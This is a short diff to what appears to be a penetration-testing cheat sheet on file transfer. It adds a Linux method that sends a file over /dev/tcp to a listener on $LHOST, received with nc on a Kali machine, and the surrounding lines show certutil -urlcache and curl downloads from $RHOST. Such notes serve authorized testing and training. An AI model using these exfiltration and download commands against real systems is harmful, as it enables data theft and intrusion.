@@ -195,6 +195,17 @@ certutil.exe -urlcache -split -f "$RHOST" outfile.zip
 curl $RHOST -o outfile
 ```
 
+### When everything else fails on Linux, no nc, no python, no scp
+On remote host:
+```
+cat file > /dev/tcp/$LHOST/$LPORT
+```
+
+On local host:
+```
+nc -lvnp $LPORT > file
+```
+
 ### From Windows to local Kali machine using impacket-smbserver
 On local Kali machine:
 ```
